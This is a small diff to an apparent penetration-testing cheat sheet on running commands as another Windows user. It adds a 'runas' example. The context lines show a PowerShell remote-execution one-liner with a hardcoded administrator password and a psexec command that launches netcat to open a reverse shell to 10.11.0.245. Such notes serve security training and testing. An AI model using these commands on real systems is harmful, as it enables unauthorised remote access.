@@ -364,6 +364,12 @@ ssh localhost -p 8080
 # Requires PSRemoting
 $username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami } 
 ```
+##### CMD
+```bash
+# Requires interactive console
+runas /user:userName cmd
+```
+
 ##### PsExec
 ```bash
 psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
